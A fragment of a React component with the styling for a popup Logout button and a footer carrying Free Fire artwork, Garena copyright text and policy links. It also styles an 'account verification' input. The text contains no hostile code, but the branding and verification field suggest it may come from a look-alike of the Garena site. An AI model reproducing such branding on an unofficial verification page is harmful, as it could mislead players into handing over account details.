                                    background: `url(${menuBtn}) center center / contain no-repeat`,
                                    color: '#c3bea7',
                                    fontSize: '20px',
                                    fontWeight: 700,
                                    border: 'none',
                                    borderRadius: '8px',
                                    padding: '7px 0',
                                    cursor: 'pointer',
                                    letterSpacing: '1px',
                                    transition: 'background 0.2s',
                                    position: 'relative',
                                    zIndex: 1,
                                    textShadow: '0 1px 4px #000',
                                    margin: '30px auto 0 auto',
                                    boxShadow: '0 2px 8px rgba(0,0,0,0.08)',
                                    display: 'block',
                                }}>Logout</button>
                            </div>
                            {/* Popup Footer Image */}
                            <div style={{width: '100%', height: '35px', overflow: 'hidden', padding: 0}}>
                                <img src={popupFooter} alt="Popup Footer" style={{width: '100%', height: '100%', objectFit: 'cover', display: 'block'}} />
                            </div>
                        </div>
                    </div>
                )}
            </div>
            {/* ++++++++++++++++++++++Footer++++++++++++++++++ */}
            <div id="footer">
                <div className="container">
                    <div className="row justify-content-center ">
                        <div className="col-10 text-center mt-2 mb-3">
                            <img width="900px" src={freefireLogo} className="img-fluid mx-auto block" alt="" />
                        </div>
                        <div className="col-10 text-center">
                            <p className="m-0">
                                <span className="copyright-icon">©</span>GARENA,inc.All rights
                                reserved
                            </p>
                            <p>
                                Privacy Policy | Terms of Use | Rules of Conduct | Official
                                Community Policy
                            </p>
                        </div>
                    </div>
                </div>
            </div>
            <style>{`
                .ff-account-verification-input::placeholder {
                    color: #e7debd !important;
                    opacity: 1;
                }
            `}</style>
        </>
    )
}
